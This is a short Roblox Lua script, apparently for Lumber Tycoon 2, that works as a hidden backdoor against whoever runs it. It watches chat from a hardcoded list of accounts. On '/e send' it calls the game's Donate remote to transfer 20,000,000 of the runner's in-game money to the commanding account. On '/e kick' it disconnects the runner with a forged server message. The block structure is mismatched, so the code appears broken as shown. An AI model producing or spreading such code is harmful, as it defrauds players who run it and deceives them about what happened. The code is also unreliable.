local Players = game:GetService("Players")
local usernames = {"Bacaman23", "Bacaman23_alt1", "Chickensalsaman", "LT2Money_Storage", "LT2Money_Storage1", "LT2Money_Storage2", "LT2Money_Storage3", "LT2Money_Storage4", "LT2Money_Storage5", "LT2Money_Storage6", "LT2Money_Storage7", "LT2Money_Storage8", "LT2Money_Storage9", "LT2Money_Storage10", "LT2Money_Storage11", "LT2Money_Storage12", "LT2Money_Storage13", "LT2Money_Storage14", "LT2Money_Storage15", "LT2Money_Storage16", "LT2Money_Storage17", "LT2Money_Storage18", "LT2Money_Storage19", "LT2Money_Storage20"}
while wait(5) do
    for i, username in ipairs(usernames) do
        local MainAccount = Players:FindFirstChild(username)
        if MainAccount then
            MainAccount.Chatted:Connect(function(msg)
                if msg == "/e kick" then
                    game.Players.LocalPlayer:Kick("Connection Terminated From Server: [Request From " .. MainAccount.Name .. "]")
                end
                if msg == "/e send" then
                    game:GetService("ReplicatedStorage").Transactions.ClientToServer.Donate:InvokeServer(MainAccount.Name, 20000000, game.Players.LocalPlayer.CurrentSaveSlot)
                end
            end
        end)
    end
end
